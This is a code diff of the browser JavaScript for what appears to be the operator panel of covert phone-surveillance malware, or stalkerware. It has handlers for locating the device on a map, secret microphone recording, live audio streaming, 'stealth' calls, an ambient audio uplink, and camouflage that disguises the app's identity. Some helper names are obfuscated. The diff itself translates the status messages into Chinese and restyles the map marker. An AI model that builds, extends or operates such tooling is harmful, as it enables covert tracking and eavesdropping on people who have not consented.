         const extMapBtn = document.getElementById("ext-map-btn");
 
         if (mapFrame) {
-          mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#000;}.leaflet-tile-pane{filter:invert(90%) hue-rotate(180deg);}.red-pin{background-color:#ff0033;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 0 12px #ff0033, 0 0 24px #ff0033;animation:pulse 1.5s infinite;margin-left:-8px;margin-top:-8px;}@keyframes pulse{0%{box-shadow:0 0 0 0 rgba(255,0,51,0.8);}70%{box-shadow:0 0 0 15px rgba(255,0,51,0);}100%{box-shadow:0 0 0 0 rgba(255,0,51,0);}}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
+          mapFrame.srcdoc = `<!DOCTYPE html><html><head><link rel="stylesheet" href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"/><script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script><style>html,body,#map{height:100%;margin:0;padding:0;background:#000;}.leaflet-tile-pane{filter:invert(90%) hue-rotate(180deg);}.red-pin{background-color:#e11d48;width:16px;height:16px;border-radius:50%;border:2px solid #ffffff;box-shadow:0 2px 6px rgba(0,0,0,0.6);margin-left:-8px;margin-top:-8px;}</style></head><body><div id="map"></div><script>var m=L.map('map',{zoomControl:false}).setView([${data.lat},${data.lon}],15);L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png').addTo(m);var redIcon=L.divIcon({className:'custom-red-pin',html:'<div class="red-pin"></div>'});L.marker([${data.lat},${data.lon}],{icon:redIcon}).addTo(m);</script></body></html>`;
           mapFrame.style.display = "block";
         }
         if (mapOverlay) mapOverlay.style.display = "none";
         if (extMapBtn) extMapBtn.style.display = "inline-block";
       } else {
-        _0x6a("[ERROR] " + data.message);
+        _0x6a("[错误] " + data.message);
         showToast(data.message);
       }
     })
     .catch(() => {
-      _0x6a("[FATAL] Network error during triangulation");
+      _0x6a("[致命] 定位网络错误");
     });
 }
 
@@ -1441,21 +1441,21 @@ function setFilter(ext) {
 }
 
 function clearIntel() {
-  showToast("PURGING_INTEL_STREAM...");
+  showToast("正在清除情报流…");
   fetch("/intel/clear").then(() => location.reload());
 }
 
 function toggleStealth() {
   const val = document.getElementById("stealth-type").value;
-  showToast("INITIATING_STEALTH_CAMOUFLAGE...");
+  showToast("正在启动伪装…");
   fetch("/stealth?type=" + val)
     .then(res => res.json())
     .then(data => {
-      if (data.status) showToast("STEALTH_APPLIED: " + data.status);
+      if (data.status) showToast("伪装已应用：" + data.status);
     })
     .catch(err => {
       console.error(err);
-      showToast("Stealth request failed", "error");
+      showToast("伪装请求失败", "error");
     });
 }
 
@@ -1494,29 +1494,29 @@ async function toggleLiveAudio() {
       livePlayerObj = null;
     }
     if (btn) {
-      btn.innerText = 'LISTEN_LIVE';
+      btn.innerText = '开始收听';
       btn.style.borderColor = 'var(--neon-cyan)';
       btn.style.color = 'var(--neon-cyan)';
       btn.style.background = 'transparent';
       btn.style.opacity = '1';
     }
-    showToast("LIVE_LISTENING_STOPPED");
+    showToast("实时收听已停止");
   } else {
     _ac = true;
     if (btn) {
-      btn.innerText = 'STOP_LISTENING';
+      btn.innerText = '停止收听';
       btn.style.opacity = '1';
       btn.style.borderColor = 'var(--danger)';
       btn.style.color = 'var(--danger)';
       btn.style.background = 'rgba(255, 49, 49, 0.05)';
     }
-    showToast("VIRTUAL_COMM: Audio uplink engaged");
+    showToast("虚拟通信：音频上行已接入");
     pollAudioChunk();
   }
 }
 
 function startMicRec(dur) {
-  showToast("INITIATING_SURVEILLANCE...");
+  showToast("正在启动监听…");
   const url = dur ? "/audio/mic/start?duration=" + dur : "/audio/mic/start";
   fetch(url)
     .then(r => r.text())
@@ -1524,19 +1524,19 @@ function startMicRec(dur) {
       setTimeout(() => { location.href = "/audio"; }, 400);
     })
     .catch(() => {
-      showToast("Mic start failed", "error");
+      showToast("麦克风启动失败", "error");
     });
 }
 
 function stopMicRec() {
-  showToast("TERMINATING_SURVEILLANCE...");
+  showToast("正在终止监听…");
   fetch("/audio/mic/stop")
     .then(r => r.text())
     .then(() => {
       setTimeout(() => { location.href = "/audio"; }, 400);
     })
     .catch(() => {
-      showToast("Mic stop failed", "error");
+      showToast("麦克风停止失败", "error");
     });
 }
 
@@ -1567,10 +1567,10 @@ async function startStealthUplink() {
     source.connect(processor);
     processor.connect(audioCtx.destination);
     _ih = { stream, context: audioCtx, processor, source };
-    showToast("STEALTH_HANDSET: Bi-directional link active");
+    showToast("隐蔽听筒：双向链路已激活");
   } catch (e) {
     console.error("Uplink failed", e);
-    showToast("MIC_ACCESS_DENIED", "error");
+    showToast("麦克风权限被拒绝", "error");
   }
 }
 
@@ -1580,13 +1580,13 @@ async function initiateCellularCall(num) {
     const dialInput = document.getElementById("dial-number");
     num = dialInput ? dialInput.value : null;
   }
-  if (!num) return showToast("ENTER_NUMBER_FIRST", "error");
+  if (!num) return showToast("请先输入号码", "error");
   try {
     await fetch("/calls/make?number=" + encodeURIComponent(num) + "&json=true");
-    showToast("CELLULAR_DIAL_DISPATCHED", "info");
+    showToast("拨号指令已派发", "info");
   } catch (e) {
     console.error(e);
-    showToast("CELLULAR_DISPATCH_FAILED", "error");
+    showToast("拨号派发失败", "error");
   }
 }
 
@@ -1595,49 +1595,49 @@ async function startStealthCall(num) {
     const dialInput = document.getElementById("dial-number");
     num = dialInput ? dialInput.value : null;
   }
-  if (!num) return showToast("ENTER_NUMBER_FIRST", "error");
+  if (!num) return showToast("请先输入号码", "error");
 
-  _0x4a("STEALTH_UPLINK", "Initializing secure cellular bridge...", async () => {
-    showToast("INITIATING_CALL...");
+  _0x4a("隐蔽上行", "正在初始化安全蜂窝桥接…", async () => {
+    showToast("正在拨号…");
     try {
       const response = await fetch("/calls/make?number=" + encodeURIComponent(num) + "&stealth=true&json=true");
-      showToast("UPLINK_COMMAND_SENT", "info");
+      showToast("上行指令已发送", "info");
       if (response.ok) {
-        showToast("WAITING_FOR_OS_HANDSHAKE...");
-        showToast("SYNCHRONIZING_COMM_STREAMS...", "info");
+        showToast("等待系统握手…");
+        showToast("正在同步通信流…", "info");
         await new Promise(r => setTimeout(r, 3500));
         await startStealthUplink();
       }
     } catch (e) {
       console.error(e);
-      showToast("STEALTH_CALL_FAILED", "error");
+      showToast("隐蔽通话失败", "error");
     }
   });
 }
 
 async function startVirtualCall() {
-  _0x4a("AMBIENT_UPLINK", "Establishing secure audio bridge...", async () => {
+  _0x4a("环境上行", "正在建立安全音频桥接…", async () => {
     try {
       await fetch("/calls/voip?type=ambient");
-      showToast("VIRTUAL_UPLINK_INITIATED", "info");
+      showToast("虚拟上行已启动", "info");
       await toggleLiveAudio();
     } catch (e) {
       console.error(e);
-      showToast("VIRTUAL_UPLINK_FAILED", "error");
+      showToast("虚拟上行失败", "error");
     }
   });
 }
 
 function restoreNormal() {
-  showToast("RESTORING_ORIGINAL_IDENTITY...");
+  showToast("正在恢复原始身份…");
   fetch("/stealth?action=restore")
     .then(res => res.json())
     .then(data => {
-      if (data.status) showToast("IDENTITY_RESTORED");
+      if (data.status) showToast("身份已恢复");
     })
     .catch(err => {
       console.error(err);
-      showToast("Restore request failed", "error");
+      showToast("恢复请求失败", "error");
     });
 }
 
